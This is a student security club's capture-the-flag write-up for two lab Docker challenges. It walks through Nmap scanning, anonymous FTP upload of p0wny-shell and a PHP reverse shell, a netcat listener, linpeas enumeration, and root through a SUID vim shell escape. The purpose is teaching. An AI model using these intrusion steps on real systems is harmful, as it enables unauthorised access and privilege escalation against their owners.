<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>ComSec Introduction Writeup - CUEH ComSec</title><meta name=Description content="A writeup for the introduction to ComSec challenges."><meta property="og:title" content="ComSec Introduction Writeup"><meta property="og:description" content="A writeup for the introduction to ComSec challenges."><meta property="og:type" content="article"><meta property="og:url" content="https://cov-comsec.github.io/posts/welcome_nmap_writeup/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-10-21T12:40:28+01:00"><meta property="article:modified_time" content="2021-10-28T23:50:54+01:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cov-comsec.github.io/logo.svg"><meta name=twitter:title content="ComSec Introduction Writeup"><meta name=twitter:description content="A writeup for the introduction to ComSec challenges."><meta name=application-name content="CUEH ComSec"><meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/welcome_nmap_writeup/><link rel=prev href=https://cov-comsec.github.io/posts/docker-compose/><link rel=next href=https://cov-comsec.github.io/posts/web_enum/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ComSec Introduction Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/welcome_nmap_writeup\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"welcome, TryHackMe, Nmap, writeup","wordcount":1359,"url":"https:\/\/cov-comsec.github.io\/posts\/welcome_nmap_writeup\/","datePublished":"2020-10-21T12:40:28+01:00","dateModified":"2021-10-28T23:50:54+01:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Tiago Pascoal"},"description":"A writeup for the introduction to ComSec challenges."}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/about/>About </a><a class=menu-item href=/galactic/>Galactic CTF </a><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/schedule/>Schedule </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/galactic/ title>Galactic CTF</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/schedule/ title>Schedule</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ComSec Introduction Writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Tiago Pascoal</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2020-21/><i class="far fa-folder fa-fw"></i>Academic Year 2020-21</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-10-21>2020-10-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1359 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div></div><div class="details toc" id=toc-static kept=true><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#nmap-1>Nmap 1</a><ul><li><a href=#nmap-scan>Nmap Scan</a></li></ul></li><li><a href=#nmap-2>Nmap 2</a></li></ul></nav></div></div><div class=content id=content><h2 id=nmap-1>Nmap 1</h2><p>Welcome to ComSec&rsquo;s first challenge! This week we will be targeting a docker container, to start it, issue the following two commands:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ wget https://cov-comsec.github.io/posts/welcome_nmap/c1/docker-compose.yaml
</span></span><span class=line><span class=cl>$ sudo docker-compose up
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali: 
</span></span><span class=line><span class=cl>WARNING: Found orphan containers <span class=o>(</span>kali_evilweb_1<span class=o>)</span> <span class=k>for</span> this project. If you removed or renamed this service in your compose file, you can run this <span class=nb>command</span> with the --remove-orphans flag to clean it up.
</span></span><span class=line><span class=cl>Recreating kali_ftp_1  ... <span class=k>done</span>
</span></span><span class=line><span class=cl>Recreating kali_smtp_1 ... <span class=k>done</span>
</span></span><span class=line><span class=cl>Starting kali_ssh_1    ... <span class=k>done</span>
</span></span><span class=line><span class=cl>Creating kali_web_1    ... <span class=k>done</span>
</span></span><span class=line><span class=cl>Attaching to kali_web_1, kali_ssh_1, kali_smtp_1, kali_ftp_1
</span></span><span class=line><span class=cl>ftp_1   <span class=p>|</span> Starting Pure-FTPd:
</span></span><span class=line><span class=cl>ftp_1   <span class=p>|</span>   pure-ftpd  -c <span class=m>30</span> -C <span class=m>10</span> -l puredb:/etc/pure-ftpd/pureftpd.pdb -j -R -P localhost -p 30000:30059  
</span></span><span class=line><span class=cl>web_1   <span class=p>|</span> AH00558: apache2: Could not reliably determine the server<span class=s1>&#39;s fully qualified domain name, using 192.168.42.4. Set the &#39;</span>ServerName<span class=s1>&#39; directive globally to suppress this message
</span></span></span><span class=line><span class=cl><span class=s1>web_1   | AH00558: apache2: Could not reliably determine the server&#39;</span>s fully qualified domain name, using 192.168.42.4. Set the <span class=s1>&#39;ServerName&#39;</span> directive globally to suppress this message
</span></span><span class=line><span class=cl>web_1   <span class=p>|</span> <span class=o>[</span>Fri Oct <span class=m>22</span> 23:08:37.325178 2021<span class=o>]</span> <span class=o>[</span>mpm_prefork:notice<span class=o>]</span> <span class=o>[</span>pid 1<span class=o>]</span> AH00163: Apache/2.4.25 <span class=o>(</span>Debian<span class=o>)</span> PHP/7.3.4 configured -- resuming normal operations
</span></span><span class=line><span class=cl>web_1   <span class=p>|</span> <span class=o>[</span>Fri Oct <span class=m>22</span> 23:08:37.326184 2021<span class=o>]</span> <span class=o>[</span>core:notice<span class=o>]</span> <span class=o>[</span>pid 1<span class=o>]</span> AH00094: Command line: <span class=s1>&#39;apache2 -D FOREGROUND&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>NB:</strong> Despite the output, the target machine will be launched at 192.168.42.1!</p><h3 id=nmap-scan>Nmap Scan</h3><p>Now the point of this week is to learn Nmap, so lets start a scan with service detection and scripting turned on:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ nmap -sV -sC 192.168.42.1 -T4
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-22 19:14 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.42.1
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00021s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp open  ftp     Pure-FTPd
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_Can<span class=s1>&#39;t get directory listing: PASV IP 127.0.0.1 is not the same as 192.168.42.1
</span></span></span><span class=line><span class=cl><span class=s1>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=s1>| ssh-hostkey: 
</span></span></span><span class=line><span class=cl><span class=s1>|   2048 f5:f2:1d:64:04:1b:fd:92:22:7e:6b:71:b7:f4:72:49 (RSA)
</span></span></span><span class=line><span class=cl><span class=s1>|   256 4b:80:f8:74:c0:8d:aa:40:fc:38:02:16:9f:1c:3b:bd (ECDSA)
</span></span></span><span class=line><span class=cl><span class=s1>|_  256 a8:08:e5:35:12:d6:a4:cc:74:8f:4c:9c:02:62:f4:f1 (ED25519)
</span></span></span><span class=line><span class=cl><span class=s1>25/tcp open  smtp    Postfix smtpd
</span></span></span><span class=line><span class=cl><span class=s1>|_smtp-commands: 8d1d2dc2ddf0.lan, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
</span></span></span><span class=line><span class=cl><span class=s1>| ssl-cert: Subject: commonName=8d1d2dc2ddf0
</span></span></span><span class=line><span class=cl><span class=s1>| Subject Alternative Name: DNS:8d1d2dc2ddf0
</span></span></span><span class=line><span class=cl><span class=s1>| Not valid before: 2020-08-14T10:33:23
</span></span></span><span class=line><span class=cl><span class=s1>|_Not valid after:  2030-08-12T10:33:23
</span></span></span><span class=line><span class=cl><span class=s1>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=s1>80/tcp open  http    Apache httpd 2.4.25 ((Debian))
</span></span></span><span class=line><span class=cl><span class=s1>| http-robots.txt: 1 disallowed entry 
</span></span></span><span class=line><span class=cl><span class=s1>|_/ftp-uploads
</span></span></span><span class=line><span class=cl><span class=s1>|_http-server-header: Apache/2.4.25 (Debian)
</span></span></span><span class=line><span class=cl><span class=s1>|_http-title: Site doesn&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl>Service Info: Host:  8d1d2dc2ddf0.lan<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.25 seconds
</span></span></code></pre></td></tr></table></div></div><p>It looks like we have 4 ports open. Let&rsquo;s check out the <a href=http://192.168.42.1 target=_blank rel="noopener noreffer">web server</a>.</p><p>From the scan, we can see that there is a directory named <a href=http://192.168.42.1 target=_blank rel="noopener noreffer">/ftp-uploads</a> and we can see that a flag file has been stored.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=imgs/ftp_anonymous.png data-srcset="/posts/welcome_nmap_writeup/imgs/ftp_anonymous.png, imgs/ftp_anonymous.png 1.5x, /posts/welcome_nmap_writeup/imgs/ftp_anonymous.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/ftp_anonymous.png title=ftpanonymous></p><p>So you have one flag.To be honest this flag works more like a hint to tell you what you should do after this. So if you go back to your nmap scan you will see that you have a line &ldquo;21/tcp open ftp Pure-ftp&rdquo; so we have a file transfer protocol it is always good to check as this can sometimes be used for file upload to the machine you are attacking. But what&rsquo;s the mean of ftp-anonymous if you do a fast google search you will find out that when this happens you can have acces to ftp server without having to know the credentials.So lets try to connect to the ftp.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp 192.168.42.1
</span></span></code></pre></td></tr></table></div></div><p>You will be asked to input the Name. You just have to type anonymous to connect.
If you do a &ldquo;ls&rdquo; you will be able do see the a file called FTPflag.txt which is the same file you found in the website. You type help you will see as the commands that you can use inside the ftp, we want to upload p0wnyshell so that we can get access to the machine through the browser. For now you just need to know that we are using p0wnyshell as our reverse-shell. So &ldquo;ctrl+c&rdquo; to stop the ftp connection clone p0wny shell repository <a href=http://github.com/flozz/p0wny-shell.git target=_blank rel="noopener noreffer">P0wny-Shell</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> p0wny-shell
</span></span><span class=line><span class=cl>ftp 192.168.42.1
</span></span><span class=line><span class=cl>put shell.php
</span></span></code></pre></td></tr></table></div></div><p>The last command is going to upload our shell.
If you go back to your browser and back to &ldquo;/ftp-uploads/anonymous&rdquo; you will see the file shell.php in there clicked and you will have p0wny-shell.<img class=lazyload src=/svg/loading.min.svg data-src=imgs/pwnyshell.png data-srcset="/posts/welcome_nmap_writeup/imgs/pwnyshell.png, imgs/pwnyshell.png 1.5x, /posts/welcome_nmap_writeup/imgs/pwnyshell.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/pwnyshell.png title=p0wny-shell> So you succefully entered the machine. Let&rsquo;s look for the last flag. A easy way to find files on linux is using the file command.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -name <span class=s2>&#34;*.txt&#34;</span> 2&gt;/dev/null
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=imgs/find_command.png data-srcset="/posts/welcome_nmap_writeup/imgs/find_command.png, imgs/find_command.png 1.5x, /posts/welcome_nmap_writeup/imgs/find_command.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/find_command.png title=findcommand></p><p>Congratulations! Lets move to docker2</p><h2 id=nmap-2>Nmap 2</h2><p>To start this challenge, use:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>wget https://cov-comsec.github.io/posts/welcome_nmap/c2/docker-compose.yaml
</span></span><span class=line><span class=cl>docker-compose up
</span></span></code></pre></td></tr></table></div></div><p>So to prove how important is nmap we setup a second nmap challenge but right now we not following the common ports as you can see in here. We mangled the ports from the <a href=/posts/welcome_nmap_writeup/imgs/commonports.pdf rel>StandardPorts</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV 192.168.42.1 -p-
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=imgs/nmap_2_scan.png data-srcset="/posts/welcome_nmap_writeup/imgs/nmap_2_scan.png, imgs/nmap_2_scan.png 1.5x, /posts/welcome_nmap_writeup/imgs/nmap_2_scan.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/nmap_2_scan.png title=nmap2scan></p><p>In this challenge the ftp part is the same as the first challenge and the first flag is the same, the only difference is that the ports have been changed so if you to &ldquo;http://192.168.42.1&rdquo; the website is not going to load you need to instead look for something like this &ldquo;192.168.42.1:8080&rdquo;.
So lets pass to the second part uploading files to ftp. We have ftp running on port 2121 (2121/tcp ccproxy-ftp) last time you use &ldquo;ftp $ip&rdquo; to connect this time that wont work cause you will need to specify the port os instead use something like this &ldquo;ftp $ip port&rdquo;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp 192.168.42.1 <span class=m>2121</span>
</span></span></code></pre></td></tr></table></div></div><p>Again use anonymous as login.
In this challegne we introduced privesc so we will need a scrip to enumerate all te services that are being run on the machine, file permissions, file types, sym links ,etc.
There are 2 that are I know, LinEnum and linpeas. I prefer <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh target=_blank rel="noopener noreffer">linpeas</a>{target=_blank}, instead of cloning the repository what I did is I open my prefered text editor on my kali box and I just copy/pasted the script. Then I stopped the ftp connection I cd to the directory where I have linpeas, I started the connection again and use the &ldquo;put linpeas.sh&rdquo; to copy linpeas to the machine. Besides linpeas we will need a php reverse shell, cause p0wny shell is not going to work in this challenge. Another good resource to put in your bookmarks, <a href=https://github.com/pentestmonkey/php-reverse-shell target=_blank rel="noopener noreffer">PentestMonkeys</a>{target=_blank} I did the same process with both linpeas and the <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php target=_blank rel="noopener noreffer">php-reverse-shell</a>{target=_blank} so open your editor and &ldquo;ctrl+c / ctrl+v&rdquo; put hte ip of your kali box in the line where you see "" \change this" and upload the file to the ftp.
So right now you should see something like this</p><p><img class=lazyload src=/svg/loading.min.svg data-src=imgs/uploads2.png data-srcset="/posts/welcome_nmap_writeup/imgs/uploads2.png, imgs/uploads2.png 1.5x, /posts/welcome_nmap_writeup/imgs/uploads2.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/uploads2.png title=ftpfodler></p><p>Which means you ready. Open a terminal and start netcat.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>1234</span>
</span></span></code></pre></td></tr></table></div></div><p>Go to &ldquo;192.168.42.1:8080/ftp-uploads/php-reverse-shell.php&rdquo; the site should be loading for ever. If you go back to your terminal you should have access to the box.
Tip: everytime I get a reverse shell I try to find out what user I am.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whoami
</span></span></code></pre></td></tr></table></div></div><p>Lets not forget we are in /var/www , we need to copy our linpeas script to tmp folder.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cp linpeas.sh /tmp
</span></span><span class=line><span class=cl>chmod +x linpeas.sh
</span></span><span class=line><span class=cl>./linpeash.sh
</span></span></code></pre></td></tr></table></div></div><p>Take a look at the output and try to find the SUID section. If you don&rsquo;t know SUID is a type of permission that you have on linux that let&rsquo;s the user run the file or binary.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=imgs/linpeas.png data-srcset="/posts/welcome_nmap_writeup/imgs/linpeas.png, imgs/linpeas.png 1.5x, /posts/welcome_nmap_writeup/imgs/linpeas.png 2x" data-sizes=auto alt=/posts/welcome_nmap_writeup/imgs/linpeas.png title=linpeas></p><p>That last line mentioning vim.basic maybe we can do some research and see how we can exploit it. Fortunately there is a good resource called <a href=https://gtfobins.github.io/ target=_blank rel="noopener noreffer">GTFOBins</a> which is used for looking how we can exploit binaries look for vim and you will see that you can spawn a shell inside vim or using the command.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>:!/bin/sh
</span></span><span class=line><span class=cl><span class=c1>#or</span>
</span></span><span class=line><span class=cl>vim -c <span class=s1>&#39;:!/bin/sh&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Now you are root!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>cd</span> /root
</span></span><span class=line><span class=cl>cat flag.txt
</span></span></code></pre></td></tr></table></div></div><p>Congratulations on solving the first ComSec challenge. Don&rsquo;t forget to submit your flags on CTFd. If you need any help, feel free to comment below or contact us on discord!</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2021-10-28&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/23f2e69848505141873a60013c2d3c89012e5a24 target=_blank title="commit by Jack Orcherton(31766070+jackorcherton@users.noreply.github.com) 23f2e69848505141873a60013c2d3c89012e5a24: Update links">
<i class="fas fa-hashtag fa-fw"></i>23f2e69</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/posts/welcome_nmap_writeup/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/welcome/>welcome</a>,&nbsp;<a href=/tags/tryhackme/>TryHackMe</a>,&nbsp;<a href=/tags/nmap/>Nmap</a>,&nbsp;<a href=/tags/writeup/>writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/docker-compose/ class=prev rel=prev title="How-To: docker-compose"><i class="fas fa-angle-left fa-fw"></i>How-To: docker-compose</a>
<a href=/posts/web_enum/ class=next rel=next title="Web Enumeration">Web Enumeration<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong><noscript>Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>